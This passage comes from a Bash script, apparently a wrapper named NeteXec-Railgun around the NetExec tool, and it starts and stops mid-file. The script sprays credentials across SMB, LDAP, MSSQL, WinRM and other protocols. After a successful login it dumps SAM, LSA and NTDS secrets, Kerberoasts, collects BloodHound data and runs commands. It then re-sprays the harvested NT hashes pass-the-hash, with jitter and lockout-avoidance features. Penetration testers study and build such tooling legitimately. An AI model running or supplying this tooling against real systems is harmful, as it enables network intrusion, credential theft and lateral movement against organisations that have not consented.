  NeteXec-Railgun -t targets.txt -C loot.txt --enum --continue
  NeteXec-Railgun -t 10.10.10.0/24 -u administrator -H aad3b4...:31d6c... --local
  NeteXec-Railgun -t dc01 -u svc -p 'Passw0rd' -d corp.local -P smb,ldap --enum-level deep
  NeteXec-Railgun -t dc01 -u administrator -H aad3b4...:31d6c... -P smb,ldap --post
  NeteXec-Railgun -t 10.10.10.5 -u sa -p 'sapass' -P mssql --post-mods xpcmd
  NeteXec-Railgun --nmap scan.gnmap -C loot.txt --lockout-guard 3 --jitter 2
  NeteXec-Railgun -t 10.10.10.0/24 -u administrator -p 'Passw0rd' --local --pth-chain
EOF
}

log()  { printf '%s[*]%s %s\n' "$C_BLUE" "$C_RESET" "$*"; }
ok()   { printf '%s[+]%s %s\n' "$C_GREEN" "$C_RESET" "$*"; }
warn() { printf '%s[!]%s %s\n' "$C_YELLOW" "$C_RESET" "$*"; }
err()  { printf '%s[-]%s %s\n' "$C_RED" "$C_RESET" "$*" >&2; }

# --- state -----------------------------------------------------------------
TARGETS=""; USER_ARG=""; PASS_ARG=""; HASH_ARG=""; COMBO=""; DOMAIN=""
LOCAL_AUTH=0; CONTINUE=0; EXTRA=""
OUTBASE="$OUTBASE_DEF"; TIMEOUT="$TIMEOUT_DEF"; RETRIES="$RETRIES_DEF"
ENUM=0; ENUM_LEVEL="standard"; ENUM_CATS=""
POST=0; POST_MODS=""; PTH_CHAIN=0
NMAP_FILE=""; LOCKOUT_GUARD=0; JITTER=0
HIDE=1; ONLY_SUCCESS=0; DRY_RUN=0; RESUME=0
PROTO_CSV=""; CONFIG=""; NO_CONFIG=0; SAVE_CONFIG=""
CUR_TARGET=""; LOCK_DIR=""

# --- config: parse KEY=value (only known keys) -----------------------------
load_config() {
    local file="$1" line key val
    [[ -f "$file" ]] || { err "config not found: $file"; exit 1; }
    while IFS= read -r line || [[ -n "$line" ]]; do
        line="${line%%#*}"                       # strip comments
        [[ "$line" =~ ^[[:space:]]*$ ]] && continue
        key="${line%%=*}"; val="${line#*=}"
        key="$(echo "$key" | tr -d '[:space:]')"
        val="${val#"${val%%[![:space:]]*}"}"     # ltrim
        val="${val%"${val##*[![:space:]]}"}"     # rtrim
        val="${val%\"}"; val="${val#\"}"         # strip surrounding quotes
        val="${val%\'}"; val="${val#\'}"
        case "$key" in
            TARGETS)    TARGETS="$val" ;;
            USER)       USER_ARG="$val" ;;
            PASS)       PASS_ARG="$val" ;;
            HASH)       HASH_ARG="$val" ;;
            COMBO)      COMBO="$val" ;;
            DOMAIN)     DOMAIN="$val" ;;
            LOCAL)      LOCAL_AUTH="$val" ;;
            CONTINUE)   CONTINUE="$val" ;;
            PROTOCOLS)  PROTO_CSV="$val" ;;
            TIMEOUT)    TIMEOUT="$val" ;;
            RETRIES)    RETRIES="$val" ;;
            ENUM)       ENUM="$val" ;;
            ENUM_LEVEL) ENUM_LEVEL="$val"; ENUM=1 ;;
            ENUM_CATS)  ENUM_CATS="$val"; ENUM=1 ;;
            POST)       POST="$val" ;;
            POST_MODS)  POST_MODS="$val"; POST=1 ;;
            PTH_CHAIN)  PTH_CHAIN="$val" ;;
            NMAP)       NMAP_FILE="$val" ;;
            LOCKOUT_GUARD) LOCKOUT_GUARD="$val" ;;
            JITTER)     JITTER="$val" ;;
            OUTPUT)     OUTBASE="$val" ;;
            EXTRA)      EXTRA="$val" ;;
            *) warn "config: ignoring unknown key '$key'" ;;
        esac
    done < "$file"
}

save_config() {
    local file="$1"
    cat > "$file" <<EOF
# NeteXec-Railgun config - generated $(date '+%Y-%m-%d %H:%M:%S')
TARGETS=${TARGETS}
USER=${USER_ARG}
PASS=${PASS_ARG}
HASH=${HASH_ARG}
COMBO=${COMBO}
DOMAIN=${DOMAIN}
LOCAL=${LOCAL_AUTH}
CONTINUE=${CONTINUE}
PROTOCOLS=${PROTO_CSV}
TIMEOUT=${TIMEOUT}
RETRIES=${RETRIES}
ENUM=${ENUM}
ENUM_LEVEL=${ENUM_LEVEL}
ENUM_CATS=${ENUM_CATS}
POST=${POST}
POST_MODS=${POST_MODS}
PTH_CHAIN=${PTH_CHAIN}
NMAP=${NMAP_FILE}
LOCKOUT_GUARD=${LOCKOUT_GUARD}
JITTER=${JITTER}
OUTPUT=${OUTBASE}
EXTRA=${EXTRA}
EOF
    ok "config written to $file"
}

# --- pre-scan for config flags so config loads before CLI overrides --------
scan_args=("$@")
for ((i=0; i<${#scan_args[@]}; i++)); do
    case "${scan_args[$i]}" in
        -c|--config) CONFIG="${scan_args[$((i+1))]:-}" ;;
        --no-config) NO_CONFIG=1 ;;
    esac
done
if [[ -n "$CONFIG" ]]; then
    load_config "$CONFIG"
elif [[ $NO_CONFIG -eq 0 && -f ./railgun.conf ]]; then
    load_config ./railgun.conf
    log "loaded ./railgun.conf"
fi

# --- arg parsing (CLI overrides config) ------------------------------------
while [[ $# -gt 0 ]]; do
    case "$1" in
        -t|--targets)   TARGETS="$2"; shift 2 ;;
        -u|--user)      USER_ARG="$2"; shift 2 ;;
        -p|--pass)      PASS_ARG="$2"; shift 2 ;;
        -H|--hash)      HASH_ARG="$2"; shift 2 ;;
        -C|--combo)     COMBO="$2"; shift 2 ;;
        -d|--domain)    DOMAIN="$2"; shift 2 ;;
        --local)        LOCAL_AUTH=1; shift ;;
        --continue)     CONTINUE=1; shift ;;
        -P|--protocols) PROTO_CSV="$2"; shift 2 ;;
        --enum)         ENUM=1; shift ;;
        --enum-level)   ENUM=1; ENUM_LEVEL="$2"; shift 2 ;;
        --enum-cats)    ENUM=1; ENUM_CATS="$2"; shift 2 ;;
        --post)         POST=1; shift ;;
        --post-mods)    POST=1; POST_MODS="$2"; shift 2 ;;
        --pth-chain)    PTH_CHAIN=1; POST=1; shift ;;
        --nmap)         NMAP_FILE="$2"; shift 2 ;;
        --lockout-guard) LOCKOUT_GUARD="$2"; shift 2 ;;
        --jitter)       JITTER="$2"; shift 2 ;;
        --timeout)      TIMEOUT="$2"; shift 2 ;;
        --retries)      RETRIES="$2"; shift 2 ;;
        --resume)       RESUME=1; shift ;;
        -o|--output)    OUTBASE="$2"; shift 2 ;;
        --show)         HIDE=0; shift ;;
        --only-success) ONLY_SUCCESS=1; shift ;;
        --dry-run)      DRY_RUN=1; shift ;;
        -x|--extra)     EXTRA="$2"; shift 2 ;;
        -c|--config)    shift 2 ;;   # already handled in pre-scan
        --no-config)    shift ;;     # already handled in pre-scan
        --save-config)  SAVE_CONFIG="$2"; shift 2 ;;
        -h|--help)      usage; exit 0 ;;
        *) err "unknown option: $1"; echo; usage; exit 1 ;;
    esac
done

# --- resolve protocol selection --------------------------------------------
if [[ -n "$PROTO_CSV" ]]; then
    IFS=',' read -r -a SELECTED <<< "$PROTO_CSV"
else
    SELECTED=("${PROTOCOLS[@]}")
    PROTO_CSV="$(IFS=,; echo "${PROTOCOLS[*]}")"
fi

# --- save-config short-circuit ---------------------------------------------
if [[ -n "$SAVE_CONFIG" ]]; then
    save_config "$SAVE_CONFIG"
    exit 0
fi

# --- validation ------------------------------------------------------------
if [[ $DRY_RUN -eq 0 ]] && ! command -v nxc >/dev/null 2>&1; then
    err "nxc (NetExec) not found in PATH. Install it: pipx install netexec"
    exit 1
fi

missing=0
if [[ -n "$NMAP_FILE" ]]; then
    [[ -f "$NMAP_FILE" ]] || { err "nmap file not found: $NMAP_FILE"; missing=1; }
elif [[ -z "$TARGETS" ]]; then
    err "missing -t/--targets (or --nmap FILE)"; missing=1
fi
if [[ -n "$COMBO" ]]; then
    [[ -f "$COMBO" ]] || { err "combo file not found: $COMBO"; missing=1; }
else
    [[ -z "$USER_ARG" ]] && { err "missing -u/--user (or use -C combo file)"; missing=1; }
    [[ -z "$PASS_ARG" && -z "$HASH_ARG" ]] && { err "need -p/--pass or -H/--hash"; missing=1; }
fi
[[ "$TIMEOUT" =~ ^[0-9]+$ ]] || { err "--timeout must be an integer"; missing=1; }
[[ "$RETRIES" =~ ^[0-9]+$ ]] || { err "--retries must be an integer"; missing=1; }
[[ "$LOCKOUT_GUARD" =~ ^[0-9]+$ ]] || { err "--lockout-guard must be an integer"; missing=1; }
[[ "$JITTER" =~ ^[0-9]+$ ]] || { err "--jitter must be an integer"; missing=1; }
if [[ $missing -eq 1 ]]; then echo; usage; exit 1; fi

for proto in "${SELECTED[@]}"; do
    found=0
    for known in "${PROTOCOLS[@]}"; do [[ "$proto" == "$known" ]] && found=1; done
    [[ $found -eq 0 ]] && { err "unsupported protocol: '$proto'"; err "valid: ${PROTOCOLS[*]}"; exit 1; }
done

# --- run dir & logging polish ----------------------------------------------
# --resume continues the most recent run (reuses ./OUTBASE/latest) so already
# completed protocol logs can be skipped; otherwise start a fresh timestamped run.
if [[ $RESUME -eq 1 && -d "$OUTBASE/latest" ]]; then
    RUNDIR="$OUTBASE/$(readlink "$OUTBASE/latest")"
    [[ -d "$RUNDIR" ]] || RUNDIR="$(cd "$OUTBASE/latest" && pwd)"
else
    RUNDIR="$OUTBASE/$(date +%Y-%m-%d_%H%M%S)"
fi
mkdir -p "$RUNDIR/hashes" || { err "cannot create run dir: $RUNDIR"; exit 1; }
ln -sfn "$(basename "$RUNDIR")" "$OUTBASE/latest" 2>/dev/null
LOCK_DIR="$RUNDIR/.lockstate"
[[ $LOCKOUT_GUARD -gt 0 ]] && mkdir -p "$LOCK_DIR"
CUR_TARGET="$TARGETS"

# --- build credential list (single entry, or one per combo line) -----------
# Each entry is US (0x1F, unit-separator)-delimited: user \x1f pass \x1f hash - NOT tab, since bash's IFS whitespace rules collapse an empty middle field when the delimiter is a tab/space/newline, silently corrupting hash-only (-H, no -p) credentials
declare -a CREDS=()
if [[ -n "$COMBO" ]]; then
    while IFS= read -r line || [[ -n "$line" ]]; do
        [[ -z "$line" || "$line" == \#* ]] && continue
        u="${line%%:*}"; p="${line#*:}"
        CREDS+=("$u"$'\x1f'"$p"$'\x1f')
    done < "$COMBO"
    [[ ${#CREDS[@]} -eq 0 ]] && { err "combo file had no usable user:pass lines"; exit 1; }
else
    CREDS+=("$USER_ARG"$'\x1f'"$PASS_ARG"$'\x1f'"$HASH_ARG")
fi
# snapshot the original creds so --pth-chain can dedupe harvested hashes
# against what we already sprayed (CREDS itself is reused for the chain round).
declare -a ORIG_CREDS=("${CREDS[@]}")

# --- lockout guard: per-user consecutive-failure counters ------------------
# File-backed (one file per user, named by md5 of the username) so the count
# survives spray_creds running in a background subshell and persists across
# protocols. A username with weird chars can't corrupt a filename this way.
lock_file_for() { printf '%s/%s' "$LOCK_DIR" "$(printf '%s' "$1" | md5sum | cut -d' ' -f1)"; }
lock_count()  { local f; f="$(lock_file_for "$1")"; [[ -f "$f" ]] && cat "$f" 2>/dev/null || echo 0; }
lock_reset()  { [[ $LOCKOUT_GUARD -gt 0 ]] || return 0; echo 0 > "$(lock_file_for "$1")"; }
lock_is_locked() {
    [[ $LOCKOUT_GUARD -gt 0 ]] || return 1
    local c; c="$(lock_count "$1")"; [[ "${c:-0}" -ge "$LOCKOUT_GUARD" ]]
}
# increment; return 0 (true) only on the call that FIRST reaches the threshold.
lock_inc() {
    local f c; f="$(lock_file_for "$1")"; c="$(lock_count "$1")"; c=$((c+1)); echo "$c" > "$f"
    [[ "$c" -eq "$LOCKOUT_GUARD" ]]
}

# --- nmap import: default open-port fingerprints per protocol --------------
proto_ports() {
    case "$1" in
        smb)   echo "445 139" ;;
        ssh)   echo "22" ;;
        ldap)  echo "389 636 3268 3269" ;;
        ftp)   echo "21" ;;
        winrm) echo "5985 5986" ;;
        wmi)   echo "135" ;;
        rdp)   echo "3389" ;;
        mssql) echo "1433" ;;
        vnc)   echo "5900 5901 5902" ;;
        nfs)   echo "2049 111" ;;
    esac
}

# Emit "host port" lines for every open tcp port. Handles nmap -oX (XML),
# -oG (greppable), or a plain host list (each host gets sentinel port 0,
# meaning "ports unknown - allow every protocol").
parse_nmap() {
    local f="$1"
    if grep -qaE '<(\?xml|nmaprun)' "$f" 2>/dev/null; then
        # mawk-compatible (no gawk 3-arg match): 2-arg match + substr. nmap XML
        # emits each <port ...portid="N"><state state="open"/> on one line, so
        # port+state pair line-by-line; host address is the latest ipv4/ipv6 one.
        awk '
          ($0 ~ /addrtype="ipv(4|6)"/) && match($0, /addr="[0-9a-fA-F:.]+"/) {
              curaddr = substr($0, RSTART+6, RLENGTH-7)
          }
          (index($0, "state=\"open\"") > 0) && match($0, /portid="[0-9]+"/) {
              if (curaddr != "") print curaddr, substr($0, RSTART+8, RLENGTH-9)
          }
        ' "$f" 2>/dev/null
    elif grep -qa 'Ports:' "$f" 2>/dev/null; then
        awk -F'\t' '
          /Ports:/ {
             host="";
             for(i=1;i<=NF;i++) if($i ~ /^Host: /){ split($i,h," "); host=h[2] }
             for(i=1;i<=NF;i++) if($i ~ /^Ports: /){
                 line=$i; sub(/^Ports: /,"",line);
                 n=split(line,ports,", ");
                 for(j=1;j<=n;j++){ split(ports[j],pp,"/"); if(pp[2]=="open") print host, pp[1] }
             }
          }' "$f" 2>/dev/null
    else
        grep -avE '^[[:space:]]*(#|$)' "$f" 2>/dev/null | awk '{print $1, 0}'
    fi
}

# Build per-protocol target files under <run>/targets, keeping only hosts that
# expose a matching port (sentinel port 0 = unknown -> always included).
build_targets_from_nmap() {
    mkdir -p "$RUNDIR/targets"
    local -A HOSTPORTS=(); local host port
    while read -r host port; do
        [[ -z "$host" ]] && continue
        HOSTPORTS["$host"]+=" $port "
    done < <(parse_nmap "$NMAP_FILE" | sort -u)
    if [[ ${#HOSTPORTS[@]} -eq 0 ]]; then
        err "nmap: no hosts parsed from $NMAP_FILE"; exit 1
    fi
    local proto ports pport inc cnt out
    for proto in "${SELECTED[@]}"; do
        out="$RUNDIR/targets/${proto}.txt"; : > "$out"
        ports="$(proto_ports "$proto")"
        for host in "${!HOSTPORTS[@]}"; do
            inc=0
            [[ "${HOSTPORTS[$host]}" == *" 0 "* ]] && inc=1
            for pport in $ports; do [[ "${HOSTPORTS[$host]}" == *" $pport "* ]] && inc=1; done
            [[ $inc -eq 1 ]] && echo "$host" >> "$out"
        done
        [[ -s "$out" ]] && sort -uo "$out" "$out"
        cnt=$(grep -c . "$out" 2>/dev/null); cnt=${cnt:-0}
        log "nmap: ${proto} -> ${cnt} candidate host(s)"
    done
}

if [[ -n "$NMAP_FILE" ]]; then
    build_targets_from_nmap
fi

# --- enumeration modules per protocol --------------------------------------
enum_for() {
    local proto="$1"; local -a e=(); local cats c
    [[ $ENUM -eq 0 ]] && return 0
    if [[ -n "$ENUM_CATS" ]]; then
        cats="$ENUM_CATS"
    else
        case "$ENUM_LEVEL" in
            light) cats="shares,users" ;;
            deep)  cats="shares,users,groups,policy,sessions,roast,deleg,rid,db" ;;
            *)     cats="shares,users,groups,policy,db" ;;   # standard
        esac
    fi
    local -a CA; IFS=',' read -r -a CA <<< "$cats"
    for c in "${CA[@]}"; do
        case "$proto:$c" in
            smb:shares)    e+=(--shares) ;;
            smb:users)     e+=(--users) ;;
            smb:groups)    e+=(--groups) ;;
            smb:policy)    e+=(--pass-pol) ;;
            smb:sessions)  e+=(--sessions --loggedon-users) ;;
            smb:rid)       e+=(--rid-brute) ;;
            ldap:users)    e+=(--users) ;;
            ldap:groups)   e+=(--groups) ;;
            ldap:policy)   e+=(--pass-pol) ;;
            ldap:roast)    e+=(--asreproast "$RUNDIR/hashes/asreproast.txt"
                               --kerberoast "$RUNDIR/hashes/kerberoast.txt") ;;
            ldap:deleg)    e+=(--trusted-for-delegation) ;;
            mssql:db)      e+=(-q "SELECT name FROM sys.databases;") ;;
            *) : ;;
        esac
    done
    ((${#e[@]})) && printf '%s\n' "${e[@]}"
}

# --- post-exploit shortcuts: run as the next logical step after a hit ------
# ntds/xpcmd are deliberately excluded from the per-protocol defaults - they
# dump the domain DB / prove code exec, so they only fire via --post-mods.
post_for() {
    local proto="$1"; local -a p=(); local mods m
    if [[ -n "$POST_MODS" ]]; then
        mods="$POST_MODS"
    else
        case "$proto" in
            smb)   mods="secrets,spider" ;;
            ldap)  mods="bloodhound" ;;
            winrm) mods="exec" ;;
            rdp)   mods="screenshot" ;;
            vnc)   mods="screenshot" ;;
            *)     mods="" ;;
        esac
    fi
    [[ -z "$mods" ]] && return 0
    local -a MA; IFS=',' read -r -a MA <<< "$mods"
    for m in "${MA[@]}"; do
        case "$proto:$m" in
            smb:secrets)     p+=(--sam --lsa) ;;
            smb:spider)      p+=(-M spider_plus) ;;
            smb:ntds)        p+=(--ntds) ;;
            ldap:bloodhound) p+=(--bloodhound -c All) ;;
            winrm:exec)      p+=(-x whoami) ;;
            mssql:xpcmd)     p+=(-x whoami) ;;
            rdp:screenshot)  p+=(-M screenshot) ;;
            vnc:screenshot)  p+=(-M screenshot) ;;
            *) : ;;
        esac
    done
    ((${#p[@]})) && printf '%s\n' "${p[@]}"
}

# --- which of our CREDS actually produced a [+] hit in this protocol's log -
# Matches by username against the "[+] domain\user:secret" lines nxc emits,
# so post-exploit reruns the exact credential that worked, not the whole list.
hit_creds_for() {
    local log="$1" cred u p h
    for cred in "${CREDS[@]}"; do
        IFS=$'\x1f' read -r u p h <<< "$cred"
        [[ -z "$u" ]] && continue
        if grep -aE '\[\+\]' "$log" 2>/dev/null | grep -qiE "(\\\\|[[:space:]])${u}:"; then
            printf '%s\n' "$cred"
        fi
    done
}

# --- run post-exploit modules for whichever cred(s) hit this protocol ------
run_postexploit() {
    local proto="$1" log="$2" base="${3:-$RUNDIR}" cred u p h outlog
    local -a PA ca HITCREDS
    mapfile -t PA < <(post_for "$proto")
    [[ ${#PA[@]} -eq 0 ]] && return 0
    mapfile -t HITCREDS < <(hit_creds_for "$log")
    [[ ${#HITCREDS[@]} -eq 0 ]] && return 0
    mkdir -p "$base/postexploit"
    for cred in "${HITCREDS[@]}"; do
        IFS=$'\x1f' read -r u p h <<< "$cred"
        ca=(-u "$u")
        [[ -n "$p" ]] && ca+=(-p "$p")
        [[ -n "$h" ]] && ca+=(-H "$h")
        [[ -n "$DOMAIN" ]] && ca+=(-d "$DOMAIN")
        [[ $LOCAL_AUTH -eq 1 ]] && ca+=(--local-auth)
        outlog="$base/postexploit/${proto}_${u}.log"
        log "post-exploit: $proto/$u -> ${PA[*]}"
        timeout "$TIMEOUT" nxc "$proto" "$CUR_TARGET" "${ca[@]}" "${PA[@]}" $EXTRA >"$outlog" 2>&1
        if grep -aqE '\[\+\]|Pwn3d!' "$outlog" 2>/dev/null; then
            ok "post-exploit: $proto/$u -> $outlog"
        else
            warn "post-exploit: $proto/$u ran, no [+] output - $outlog"
        fi
    done
}

# --- pass-the-hash chaining: harvest NT hashes dumped by --post ------------
# Scans post-exploit output (and any --ntds dump) for pwdump-format lines
# (user:rid:lm:nt:::), then emits US-delimited PtH creds (user, no pass,
# lm:nt). Skips machine accounts ($) and the empty-password NT hash, and
# de-dupes against the creds we already sprayed this run.
EMPTY_NT="31d6cfe0d16ae931b73c59d7e0c089c0"
harvest_pth_creds() {
    local -A had=()
    local cred u p h nt f
    for cred in "${ORIG_CREDS[@]}"; do
        IFS=$'\x1f' read -r u p h <<< "$cred"
        [[ -n "$h" ]] && had["${u,,}:${h##*:}"]=1
    done
    shopt -s nullglob
    local -a sources=("$RUNDIR"/postexploit/*.log "$RUNDIR"/hashes/*)
    shopt -u nullglob
    local -A seen=()
    for f in "${sources[@]}"; do
        [[ -f "$f" ]] || continue
        grep -aoE '[^:[:space:]]+:[0-9]+:[a-fA-F0-9]{32}:[a-fA-F0-9]{32}:::' "$f" 2>/dev/null
    done | sort -u | while IFS=: read -r u _rid lm nt _rest; do
        [[ -z "$u" || -z "$nt" ]] && continue
        [[ "$u" == *'$' ]] && continue
        [[ "${nt,,}" == "$EMPTY_NT" ]] && continue
        local key="${u,,}:${nt,,}"
        [[ -n "${had[$key]:-}" || -n "${seen[$key]:-}" ]] && continue
        seen["$key"]=1
        printf '%s\x1f\x1f%s:%s\n' "$u" "$lm" "$nt"
    done
}

# --- interactivity ---------------------------------------------------------
INTERACTIVE=0
[[ -t 0 && -t 1 && $DRY_RUN -eq 0 ]] && INTERACTIVE=1

SKIP_CUR=0; PAUSE_REQ=0; ABORT=0; TAILPID=""; CUR_PID=""
cleanup() {
    [[ -n "${TAILPID:-}" ]] && kill "$TAILPID" 2>/dev/null
    [[ -n "${CUR_PID:-}" ]] && { kill "$CUR_PID" 2>/dev/null; pkill -TERM -P "$CUR_PID" 2>/dev/null; }
}
trap cleanup EXIT
trap 'ABORT=1' INT

# --- spray one protocol across all creds (runs in background) --------------
spray_creds() {
    local proto="$1" log="$2" cred u p h rc attempt tmpout
    local -a ca
    : > "$log"
    tmpout="$(mktemp 2>/dev/null || echo "${log}.tmp")"
    for cred in "${CREDS[@]}"; do
        IFS=$'\x1f' read -r u p h <<< "$cred"
        # lockout guard: don't touch a user that's already hit the threshold
        if [[ $LOCKOUT_GUARD -gt 0 ]] && lock_is_locked "$u"; then
            echo "[railgun] LOCKOUT-GUARD: skipping '$u' (>=${LOCKOUT_GUARD} consecutive fails)" >>"$log"
            continue
        fi
        ca=(-u "$u")
        [[ -n "$p" ]] && ca+=(-p "$p")
        [[ -n "$h" ]] && ca+=(-H "$h")
        [[ -n "$DOMAIN" ]] && ca+=(-d "$DOMAIN")
        [[ $LOCAL_AUTH -eq 1 ]] && ca+=(--local-auth)
        [[ $CONTINUE -eq 1 ]] && ca+=(--continue-on-success)
        attempt=0
        while :; do
            timeout "$TIMEOUT" nxc "$proto" "$CUR_TARGET" "${ca[@]}" \
                ${ENUMARR[@]+"${ENUMARR[@]}"} $EXTRA >"$tmpout" 2>&1
            rc=$?
            cat "$tmpout" >>"$log"
            [[ $rc -eq 124 ]] && echo "[railgun] TIMEOUT after ${TIMEOUT}s" >>"$log"
            [[ $rc -ne 124 ]] && break
            attempt=$((attempt+1))
            [[ $attempt -gt $RETRIES ]] && break
            echo "[railgun] retry $attempt/$RETRIES" >>"$log"
        done
        # lockout accounting: only a real auth verdict counts, never a timeout.
        # A [+] resets the user's streak; a [-] with no [+] extends it.
        if [[ $LOCKOUT_GUARD -gt 0 && $rc -ne 124 ]]; then
            if grep -aqE '\[\+\]' "$tmpout" 2>/dev/null; then
                lock_reset "$u"
            elif grep -aqE '\[-\]' "$tmpout" 2>/dev/null; then
                if lock_inc "$u"; then
                    echo "[railgun] LOCKOUT-GUARD: '$u' reached ${LOCKOUT_GUARD} consecutive fails - skipping it from here on" >>"$log"
                fi
            fi
        fi
        [[ $JITTER -gt 0 ]] && sleep "$(( RANDOM % (JITTER + 1) ))"
    done
    rm -f "$tmpout"
}

# --- monitor a running spray: spinner + live keys --------------------------
monitor() {
    local pid="$1" log="$2" proto="$3"
    local spin='|/-\' si=0 reveal=$(( HIDE==0 ? 1 : 0 )) key hits
    TAILPID=""
    if [[ $reveal -eq 1 ]]; then
        printf '%s--- live: %s (v to hide) ---%s\n' "$C_CYAN" "$proto" "$C_RESET"
        tail -n +1 -f "$log" 2>/dev/null & TAILPID=$!
    fi
    while kill -0 "$pid" 2>/dev/null; do
        if [[ $reveal -eq 0 ]]; then
            hits=$(grep -acE '\[\+\]' "$log" 2>/dev/null); hits=${hits:-0}
            printf '\r%s[%s]%s spraying %-6s hits:%s  %s(v)iew (s)kip (p)ause (q)uit%s   ' \
                "$C_BLUE" "${spin:si%4:1}" "$C_RESET" "$proto" "$hits" "$C_YELLOW" "$C_RESET"
            si=$((si+1))
        fi
        if [[ $INTERACTIVE -eq 1 ]]; then
            IFS= read -rsn1 -t 0.2 key < /dev/tty || key=""
        else
            sleep 0.2; key=""
        fi
        case "$key" in
            v|V)
                if [[ $reveal -eq 0 ]]; then
                    reveal=1; printf '\r%*s\r' 78 ''
                    printf '%s--- live: %s (v to hide) ---%s\n' "$C_CYAN" "$proto" "$C_RESET"
                    tail -n +1 -f "$log" 2>/dev/null & TAILPID=$!
                else
                    reveal=0
                    [[ -n "$TAILPID" ]] && { kill "$TAILPID" 2>/dev/null; wait "$TAILPID" 2>/dev/null; TAILPID=""; }
                    printf '%s--- output hidden ---%s\n' "$C_CYAN" "$C_RESET"
                fi ;;
            s|S) SKIP_CUR=1; kill "$pid" 2>/dev/null; pkill -TERM -P "$pid" 2>/dev/null; break ;;
            p|P) PAUSE_REQ=1 ;;
            q|Q) ABORT=1; kill "$pid" 2>/dev/null; pkill -TERM -P "$pid" 2>/dev/null; break ;;
        esac
    done
    [[ -n "${TAILPID:-}" ]] && { kill "$TAILPID" 2>/dev/null; wait "$TAILPID" 2>/dev/null; TAILPID=""; }
    printf '\r%*s\r' 78 ''
}

# --- ANSI stripper for clean summaries -------------------------------------
strip_ansi() { sed -r 's/\x1b\[[0-9;]*m//g'; }

# --- header ----------------------------------------------------------------
banner
if [[ -n "$NMAP_FILE" ]]; then
    log "Targets   : nmap:$NMAP_FILE (per-protocol port-filtered)"
else
    log "Targets   : $TARGETS"
fi
if [[ -n "$COMBO" ]]; then
    log "Creds     : combo file $COMBO (${#CREDS[@]} pairs)"
else
    log "User      : $USER_ARG"
    [[ -n "$PASS_ARG" ]] && log "Pass      : $PASS_ARG"
    [[ -n "$HASH_ARG" ]] && log "Hash      : $HASH_ARG"
fi
[[ -n "$DOMAIN" ]] && log "Domain    : $DOMAIN"
log "Protocols : ${SELECTED[*]}"
[[ $ENUM -eq 1 ]] && log "Enum      : ${ENUM_CATS:-level=$ENUM_LEVEL}"
[[ $POST -eq 1 ]] && log "Post      : ${POST_MODS:-per-protocol defaults}"
[[ $PTH_CHAIN -eq 1 ]] && log "PtH-chain : on (re-spray harvested hashes once)"
[[ $LOCKOUT_GUARD -gt 0 ]] && log "Lockout   : guard at ${LOCKOUT_GUARD} consecutive fails/user"
[[ $JITTER -gt 0 ]] && log "Jitter    : 0-${JITTER}s between attempts"
log "Timeout   : ${TIMEOUT}s   Retries: $RETRIES"
log "Run dir   : $RUNDIR"
echo

# --- dry-run: just print commands ------------------------------------------
if [[ $DRY_RUN -eq 1 ]]; then
    warn "DRY-RUN - no commands are executed"
    [[ $LOCKOUT_GUARD -gt 0 ]] && warn "lockout-guard active: a user is dropped after ${LOCKOUT_GUARD} consecutive fails"
    [[ $JITTER -gt 0 ]] && warn "jitter active: 0-${JITTER}s sleep between attempts"
    for proto in "${SELECTED[@]}"; do
        if [[ -n "$NMAP_FILE" ]]; then
            dtarget="$RUNDIR/targets/${proto}.txt"
            if [[ ! -s "$dtarget" ]]; then
                printf '  %s(skip %s - no nmap hosts with its ports open)%s\n' \
                    "$C_YELLOW" "$proto" "$C_RESET"
                continue
            fi
        else
            dtarget="$TARGETS"
        fi
        mapfile -t ENUMARR < <(enum_for "$proto")
        for cred in "${CREDS[@]}"; do
            IFS=$'\x1f' read -r u p h <<< "$cred"
            ca=(-u "$u")
            [[ -n "$p" ]] && ca+=(-p "$p")
            [[ -n "$h" ]] && ca+=(-H "$h")
            [[ -n "$DOMAIN" ]] && ca+=(-d "$DOMAIN")
            [[ $LOCAL_AUTH -eq 1 ]] && ca+=(--local-auth)
            [[ $CONTINUE -eq 1 ]] && ca+=(--continue-on-success)
            printf '  timeout %s nxc %s %q' "$TIMEOUT" "$proto" "$dtarget"
            printf ' %q' "${ca[@]}" ${ENUMARR[@]+"${ENUMARR[@]}"}
            [[ -n "$EXTRA" ]] && printf ' %s' "$EXTRA"
            printf '\n'
        done
        if [[ $POST -eq 1 ]]; then
            mapfile -t PA < <(post_for "$proto")
            if ((${#PA[@]})); then
                printf '  %s-> on a hit, post-exploit would run:%s\n' "$C_YELLOW" "$C_RESET"
                printf '    timeout %s nxc %s %q -u <hit-user> [-p/-H <hit-secret>]' \
                    "$TIMEOUT" "$proto" "$dtarget"
                printf ' %q' "${PA[@]}"
                printf '\n'
            fi
        fi
    done
    [[ $PTH_CHAIN -eq 1 ]] && printf '  %s-> after the run, NT hashes dumped by --post would be re-sprayed pass-the-hash (one round)%s\n' "$C_YELLOW" "$C_RESET"
    exit 0
fi

# --- one full pass over a protocol list ------------------------------------
# Spray CREDS (global) across the given protocols, writing logs under $base.
# Results/hits are returned via the caller-named assoc arrays (namerefs), so a
# --pth-chain second round reports separately from the primary run.
#   $1 base dir  $2 result-array name  $3 hits-array name  $4 protocol-array name
run_all_protocols() {
    local base="$1"; local -n _RES="$2" _HIT="$3" _PROTOS="$4"
    local proto log_file hits
    mkdir -p "$base"
    for proto in "${_PROTOS[@]}"; do
        [[ $ABORT -eq 1 ]] && { warn "aborted - skipping remaining protocols"; break; }

        # resolve this protocol's target (nmap mode filters by open port)
        if [[ -n "$NMAP_FILE" ]]; then
            CUR_TARGET="$RUNDIR/targets/${proto}.txt"
            if [[ ! -s "$CUR_TARGET" ]]; then
                warn "nmap: no hosts expose ${proto} ports - skipping"
                _RES[$proto]="NOHOST"; _HIT[$proto]=0
                continue
            fi
        else
            CUR_TARGET="$TARGETS"
        fi

        log_file="$base/${proto}.log"
        if [[ $RESUME -eq 1 && -s "$log_file" ]]; then
            warn "resume: skipping $proto (log already present)"
            continue
        fi

        mapfile -t ENUMARR < <(enum_for "$proto")
        SKIP_CUR=0

        spray_creds "$proto" "$log_file" & CUR_PID=$!
        monitor "$CUR_PID" "$log_file" "$proto"
        wait "$CUR_PID" 2>/dev/null
        CUR_PID=""

        # classify
        hits=$(grep -acE '\[\+\]' "$log_file" 2>/dev/null); hits=${hits:-0}
        if [[ $SKIP_CUR -eq 1 ]]; then
            _RES[$proto]="SKIP"
        elif grep -aq 'Pwn3d!' "$log_file" 2>/dev/null; then
            _RES[$proto]="PWN3D"
            ok "$proto -> PWN3D! ($hits hit(s)) - $log_file"
        elif [[ $hits -gt 0 ]]; then
            _RES[$proto]="VALID"
            ok "$proto -> valid login(s) ($hits) - $log_file"
